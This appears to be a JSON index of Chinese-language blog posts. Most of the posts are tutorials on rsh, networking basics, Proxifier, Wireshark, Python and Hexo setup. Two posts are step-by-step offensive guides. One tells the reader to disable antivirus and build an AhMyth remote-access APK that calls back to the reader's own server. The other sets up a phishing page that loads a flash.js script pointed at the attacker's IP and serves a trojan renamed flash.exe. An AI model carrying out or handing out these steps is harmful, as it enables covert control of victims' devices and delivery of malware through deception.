shell）的缩写。该命令在指定的远程主机上启动一个shell并执行用户在rsh命令行中指定的命令。如果用户没有给出要执行的命令，rsh就用rlogin命令使用户登录到远程机上。 目前rsh很少被应用到一般的服务器上，尤其是对Internet开放的主机，这是因为rsh的危险性很高。它不但是明文传输，而且一旦设置不当，可能会让所有人都能够使用rsh来登录远程主机。不过，rsh却是操作群集计算机（Cluster）里最常见的服务之一。 所谓的群集计算机，简单地说就是将很多台主机通过网络连接在一起，以其中一台主机作为主控计算机，称为Master，其他主机负责来自Master的请求，称为 Slave，所有的计算机工作都是由Master掌控的，Slave负责运行部分。在这种情况下，Slave接受Master命令的最主要途径就是通过rsh。 Linux系统上提供在线安装软件的功能，前提是确保电脑可以连接上互联网，在线安装软件非常方便，用户只需要对应的软件名称，不需要考虑该软件的依赖情况，在线安装会自动的搜索该软件的所有依赖包，然后自动完成安装。 在线安装是指不需要用户亲自下对应软件的包，但是需要对应系统能够访问互联网，不同的Linux系统使用不同的工具进行在线安装软件，常见的在线安装软件的工具如下所示： 1Ubuntu/Debian系统使用apt-get进行在线安装软件；Redhat/CentOS系统使用yum进行在线安装软件； 安装Rsh服务器本实验环境使用的系统是Ubuntu，所以使用apt-get工具来在线安装软件，具体步骤如下所示： 1更新软件源：sudo apt-get update安装Rsh服务器：sudo apt-get install rsh-server 如果安装成功则会在/etc/init.d目录下生成一个openbsd-inetd文件： 注意：如果当前用户是root，则执行以上安装命令时不需要加sudo。 安装Rsh客户端本实验环境使用的系统是Ubuntu，所以使用apt-get工具来在线安装软件，具体步骤如下所示： 1更新软件源：sudo apt-get update安装Rsh客户端：sudo apt-get install rsh-client 如果安装成功，我们系统中就会有rsh命令，查看是否存在rsh命令： 注意：只需要更新一次软件源即可，不需要每次安装软件前进行源更新操作。 71.Linux service 命令Linux系统中使用service命令来控制系统服务，它可以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。 1service`命令的使用格式：`service 服务名 控制命令 服务名：自动要控制的服务名，即/etc/init.d目录下的脚本文件名； 控制命令：系统服务脚本支持的控制命令； 常见的控制命令： 1start：启动该服务；stop：关闭该服务；restart：重新启动该服务；status：查看该服务状态； 注意并不是所有的服务都支持以上4种控制命令，不同的服务提供不同的控制命令，大多数服务都支持以上4种常用的控制命令。 72.Rsh服务管理当我们成功安装Rsh服务器后，接下来，我们使用service命令来管理Rsh 服务。 我们将在以下案例演示中分别介绍如何启动、关闭、重新启动Rsh服务，以及查看 Rsh 服务状态。 （1）查看Rsh服务状态，可以使用如下命令： 1sudo service openbsd-inetd status 可以看到当前没有发现inetd进程，也就是Rsh服务是没有启动的。 （2）开启Rsh服务并且查看是否开启成功，可以使用如下命令： 12sudo service openbsd-inetd startsudo service openbsd-inetd status （3）重启Rsh服务并且查看是否重启成功，可以使用如下命令： 12sudo service openbsd-inetd restartsudo service openbsd-inetd status （4）关闭Rsh服务并且查看是否关闭成功，可以使用如下命令： 12sudo service openbsd-inetd stopsudo service openbsd-inetd status 73.rsh远程登录服务器1rsh` 命令格式：`rsh 选项 参数 常见选项： 1-d：使用Socket层级的排错功能。-n：把输入的指令号向代号为/dev/null的特殊外围设备。-l&lt;用户名称&gt;：指定要登入远端主机的用户名称； 参数： 1远程主机：指定要登录进行管理的远程主机；命令：指定执行的命令； 使用rsh登录本机，登录用户为testUser，具体使用如下步骤： 1rsh -l testUser localhost 此时，我们只需要输入远程主机的用户名密码即可登录成功，此时用户即可进行一系列操作。","path":"2023/12/04/linux_stduy/","date":"12-04","excerpt":"","tags":[]},{"title":"网络安全知识基础和Proxifier的使用","text":"一、Windows IP 配置1. 以太网适配器计算机与外界连接网络是通过主机箱插入一块网络接口板。网络接口板又称通信适配器或网络适配器或网络接口卡NIC，简单的名称为‘网卡’。 2. 以太网有线网络 3. 虚拟网卡以太网适配器VMware Network Adapter VMnet1、 VMware Network Adapter VMnet8 4. 无线局域网适配器 WLAN（即是wifi） （1） ipv6 ​ 也被称为IPng（IP Next Generation），也就是下一代IP协议。 ipv6地址总长度为128比特，分为8组，每组为4个十六进制数的形式，每组十六进制数间隔。 例如：FC00:0000:130F:0000:0000:09C0:876A:130B ipv6地址缩写规则： 每组中的前导“0”都可以省略，即一组中全为0，则可以只写一个0，所以上述地址可写为：FC00:0:130F:0:0:9C0:876A:130B。 地址中包含的连续两个或多个均为0的组，可以用双冒号“::”来代替 所以上述地址又可以进一步简写为：FC00:0:130F::9C0:876A:130B。 需要注意的是，在一个IPv6地址中只能使用一次双冒号“::”（一般用于0最多的一段） （2） ipv4 本地ip地址，IPv4 全称为 Internet Protocol version 4，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP 地址是一个 32 位的二进制数，算下来其实也只有 2^32 个地址，这些地址中有分为 A、B、C、D、E 5 类 ip地址的表示 IP地址由32位二进制数组成，为了方便记忆，将IP地址32位进制数进行分段，每段8位，共4段，然后将没段8位二进制转换为十进制数，中间点号分割。 特殊ip地址 （a） 广播地址 一个子网内的所有网络接口都能收到此广播消息 直接广播：带目标网络号，主机地址二进制全为1的地址 有限广播：网络号和主机地址二进制全为1的地址（即255.255.255.255） （b）网络地址 主机地址二进制全为0的地址 如实际中常用的127.0.0.1，别名localhost 主要用于对本地回路测试及实现本地机器进程间的通信。 (3) 子网技术 子网掩码 子网掩码与 IP 地址相同，32位二进制数。对于子网掩码的取值，对应于 IP 地址，网络号和子网号的所有二进制位设置为1，主机号的所有二进制位设置为0。 子网掩码的表示方法 点分十进制：表示法与ip地址中相同 网络前缀标记法（网络地址位数）：从左到右连续的取网络号和子网号的位数来表示子网掩码。列如，一个子网掩码为255.255.0.0 的 B类网络地址 156.81.0.0，用网络前缀标记法表示为 156.81.0.0&#x2F;16。 (4)公网和私网 公网（外网) ip 公网地址也称为全球唯一IP地址，是指可以直接在Internet上访问的IP地址。这些地址由互联网注册机构分配，具有全球唯一性和全球可达性。 公网地址通常用于互联网上的服务器、路由器和其他网络设备。它们可以直接访问Internet上的其他设备，可以通过Internet进行通信和数据传输。 私网（内网) ip： 私网地址也称为局域网IP地址，是指在局域网内部使用的IP地址。它们不具有全球唯一性和全球可达性，只能在局域网内部使用。 私网地址通常用于组建局域网，例如家庭网络、企业内部网络、校园网络等。在局域网内部，可以通过私网地址进行设备间的通信和数据传输。但是，如果要访问Internet上的其他设备，必须通过路由器进行转发。 私网的3类ip地址范围 A类地址:10.0.0.0~10.255.255.255 B类地址:172.16.0.0~172.31.255.255 C类地址:192.168.0.0~192.168.255.255 二、IP访问过程 1. 云一层一层上传，包括多个路由器、基站，发送至想访问的公网ip 2. 静态ip由路由器分配ip 3. 动态ip 动态IP的原理： 动态IP（Dynamic IP Address）是由网络服务提供商（ISP）自动分配的一种IP地址，该IP地址一般具有较短的租用期限，因此每次重新连接网络时，其IP地址会发生变化。其原理是将一定数量的IP地址作为可用地址池，在进行动态IP地址分配的过程中，一般采用动态主机配置协议（DHCP）从地址池中选取一个可用地址与设备建立通信，并将该地址分配给设备，以使设备可以连接到互联网。 4. 当动态ip设置为静态ip时大概率是动态ip上不了网。（实际上什么情况都有可能发生，主要因路由器不同设置导致） 5. socks5协议是一种代理协议。Socks 5 协议工作在传输层 (Transport Layer) 与应用层 (Application Layer) 的中间, 提供了一种对应用层协议透明的代理服务。对于传输层协议仅支持 TCP 协议 6. OSI七层模型 OSI七层模型是一种网络协议参考模型，用于描述和规范计算机网络中不同层次的功能和交互关系。它包括以下七层： 1.物理层(Physical Layer):负责传输比特流，包括电器、光学和机械接口等物理特性。 常见协议:Ethernet,RS-232,USB,光纤等 2.数据链路层(Date Link Layer):负责在直接相连的节点之间传输帧，处理物理地址(MAC地址)和错误检测等。 常见协议:Ethernet(IEEE 802.3),PPP(点对点协议),HDLC(高级数据链路控制),ARP(地址解析协议)等 3.网络层(Network Layer):负责在不同网络之间传输数据包，处理逻辑地址（ip地址）和路由选择等。 常见协议:IP(Internet协议)，ICMP(Internet控制消息协议),IPsec(IP安全性协议),OSPF(开放最短路径优先协议)等 4.传输层(Transport Layer):负责端到端的可靠传输和流量控制，提供传输协议(如TCP、UDP) 常见协议:TCP(传输控制协议)，UDP(用户数据报协议),SCIP(流控制传输协议)等 5.会话层(Session Layer):负责建立、管理和终止会话，确保数据在通信系统中的同步。 常见协议:NetBIOS(网络基本输入输出系统),RPC(远程过程调用协议),SSH(安全外壳协议)等 6.表示层(Presentation Layer):负责数据的格式转换、数据加密和解密、数据压缩和解压缩等。 常见协议:ACSII码,JPEG(联合图像专家组),MPEG(动态图像压缩标准)等 7.应用层(Application Layer):负责应用程序之间的通信和数据交互，提供各种应用服务。 常见协议:HTTP(超文本传输协议),FTP(文件传输协议),SMTP(简单邮件传输协议),DNS(域名系统)等 每一层都有自己的功能和协议，通过不同层次之间的协同工作，实现了网路通信的可靠性和灵活性。 7. 路由器 路由器可作为一个网络的划分，同一个路由器下的设备是互通的 路由器表会记录要访问的ip 源ip，源MAC，目的ip,目的MAC称为四象限 交换机：集线器的作用，把多个设备的信号集中输出到路由器上（类似快递员的作用） 8. win操作系统和驱动 操作系统是指控制和管理整个计算机系统的硬件和软件资源，并合理的组织和调度计算机的工作和资源的分配，以提供给用户和其它软件方便的接口和环境。 驱动是指驱动计算机里软件的程序，初始化和配置硬件，实现硬件的数据的接受和发送 9. NAT进行地址转换,等同于路由器，输出是由物理机ip输出，nat外的ip是访问不了nat内的服务器。 三、proxifier软件的使用 在192.168.2.6:5244下载proxifier压缩文件，打开猫的局域网连接，打开proxifier,点击配置文件 点击编辑，如图设置，点击确定（ssh*;表示打开所有ssh开头的文件） 移除第一行，将default改为direct放行 重启proxifier，win+r，输入cmd，在命令行中输入ssh &#x72;&#111;&#111;&#116;&#x40;&#49;&#x2e;&#49;&#x2e;&#49;&#x2e;&#x31;，会在proxifier出现记录（大概率访问失败） 四、wireshark说明 源ip过滤： ip.src &#x3D;&#x3D; 源ip地址 目的ip过滤 ： ip.dst &#x3D;&#x3D; 目的ip地址 DNS一般在78左右，50-130 下图红框所表示的意思：排序 时间戳 源Ip 目的ip 协议 DNS大小 数据包的简要信息","path":"2023/12/04/WangLuoAnQuanJiChu/","date":"12-04","excerpt":"","tags":[]},{"title":"Ahmyth的使用","text":"一、java环境安装 在192.168.2.6:5244找到jdk-8u341-windows-x64，并安装 安装完java后，新建文件夹安装jre 下载everything查看所有java文件，搜索java.exe，右键查看bin文件的路径。在路径下输入cmd,在命令行中输入 java -version查看java版本。 everything下载地址https://www.voidtools.com/zh-c n/ 在设置中找到病毒和威胁防护，关闭实时保护 java环境变量设置 右键计算机，点击属性，点击高级系统设置 点击环境变量，在用户变量双击path，查看是否有java的路径，有就删掉 找到系统变量的path，双击进入，添加java8（找到java8的bin文件，复制）的路线，并且上移至所有java路径的上方，点击确定→确定（环境变量） 按win+R,输入cmd,输入java -version确定是否是Java8环境 二、ahmyth的使用 在192.168.2.6:5244下载ahmyth 下载mumu模拟器6（12可能运行不了） 打开ahmyth.exe运行 port默认端口42474，可自己设置，不与默认端口冲突即可。设置好端口，点击listen 点击APK Builder，输入自己服务器的ip，以及之前设置的端口。 点击build，生成apk文件，路径会在下方框显示 找到apk文件，移入mumu模拟器中，运行apk文件，在victims点击open the lab，即可进行一些远程遥控的操作。","path":"2023/12/04/AhMyth_use/","date":"12-04","excerpt":"","tags":[]},{"title":"图床搭建","text":"下载并安装node.js 下载并安装PicGo typora-偏好设置 进入GitHub，点击右上角头像，点击your repositories,点击new创建新库 点击右上角头像，点击setting→developer setting→personal 创建ssh picgo的GitHub设置 上传前将picgo设置为时间戳重命名 设置完成后进入typora偏好设置，点击验证图片上传","path":"2023/12/03/tuchuang/","date":"12-03","excerpt":"","tags":[]},{"title":"python安装","text":"进入192.168.2.6：5244搜索python，或者进入python官网下载python（需要和电脑版本一致的版本，右键计算机-属性查看） 安装python 打开安装包，勾选add python 3.8 to PATH,点击Customize installation进入下一页 全选，点击next 勾选add python to environmnet variables,选择安装路径（默认c盘）,点击install 测试python是否能调用 在python文件夹下，输入cmd 进入命令行，输入python 出现以下界面则安装成功","path":"2023/12/03/python/","date":"12-03","excerpt":"","tags":[]},{"title":"利用github搭博客","text":"准备前提 提前安装好(node.js)[https://nodejs.org/en] 左边的那个 提前安装好(GIt)[https://git-scm.com/downloads] 提前注册好一个github账号 如果文章图片没有显示，请自行挂代理 操作步骤 在本地找个目录放博客 在选定的目录下，右键Git Bash Here 使用nmp命令安装hexo，输入：1234npm install -g hexo-clihexo init blogcd bloghexo g 构建好的效果图 cd 进入这个目录 为了检测我们的网站雏形，分别按顺序输入以下三条命令： 1234hexo new test_my_sitehexo ghexo s#之后就可以访问127.0.0.1:4000访问blog了 配置ssh (1) cd~/.ssh检查本机已存在的ssh密钥如果提示：No such file or directory 说明你是第一次使用git。(2) ssh-keygen -t rsa -C “邮件地址”然后连续3次回车，最终会生成一个文件在用户目录下(3) 打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：(4) key填写C:\\Users\\Administrator.ssh\\id_rsa.pub中的内容(5) 尝试ssh连接,测试是否成功ssh -T [git@github.com](mailto:git@github.com) # 注意邮箱地址不用改(6) 如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功： (7) 在选中的位置(blog目录下)打开cmd(以管理员身份) npm install hexo-deployer-git –save (8) 在上一个Git Bash Here还需要继续配置 12git config --global user.name “guangfa29”// 你的github用户名，非昵称git config --global user.email “1814124180@qq.com“// 填写你的github注册邮箱 准备上传代码 (1) github上新建一个存储库，命名为guangfa29(用户名).github.io (2) 编辑_config.yml文件，在最后改成这样 12345deploy:type: gitrepository: git@github.com:guangfa29/guangfa29.github.io.gitbranch: main#后三行需隔开一个tab的位置 (3) 注意保持格式，缩进不对，会导致一会儿，上传不成功 (4) 最后输入hexo d上传 (5) 在创建的存储库的设置中-pages-如图设置 hexo命令介绍12345678910111213141516hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令hexo version #查看Hexo的版本hexo generate #生成静态页面至public目录hexo s -g #生成并本地预览hexo d -g #生成并上传","path":"2023/12/03/daboke/","date":"12-03","excerpt":"","tags":[]},{"title":"钓鱼页面优化","text":"打开虚拟机安装phpstudy 打开phpstudy，启动Apache 点击网站，点击管理，打开根目录,删除www文件夹里文件 新建文本文档，改为index.html后缀 打开vscode（可在物理机中，在桌面新建文件夹，在文件夹下新建文本文档改为index.html）,通过vscode打开这个文件夹 输入 ！ 按tab键 在body输入&lt;h1&gt;……&lt;/h1&gt; 将代码复制到虚拟机index.html（以记事本打开） 打开浏览器，输入127.0.0.1，可看见输入内容以网页方式 在body后面插入&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt; 将整个代码复制如上步骤打开浏览器 下载flash文件（微信文件）放在虚拟机中www文件下，文件名改名为flash.js 右键点击flash点击编辑 将http后面改成自己的ip地址（php所在电脑），点击保存 如果不能保存，则在桌面新建文本文档改为flash.js 右键编辑复制进去，再放入www文件夹下 将木马程序改为flash.exe放在www文件夹下","path":"2023/12/03/diaoyuyemianyouhua/","date":"12-03","excerpt":"","tags":[]}],"categories":[],"tags":[]}